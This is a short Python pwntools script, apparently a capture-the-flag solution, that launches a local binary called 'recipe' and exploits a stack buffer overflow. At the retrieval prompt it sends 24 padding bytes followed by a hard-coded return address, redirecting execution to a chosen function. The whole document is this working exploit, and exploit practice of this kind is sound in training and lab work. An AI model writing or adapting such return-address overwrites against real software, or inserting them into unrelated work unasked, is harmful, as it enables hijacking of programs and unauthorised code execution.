#!/usr/bin/python3
from pwn import *

payload = b'a'*24+b'\xb6\x11\x40'+b'\n'

p = process("recipe")
input()

print(p.readuntil("recipe you want to retrieve:").decode())
p.write(payload)
print(p.readall().decode())
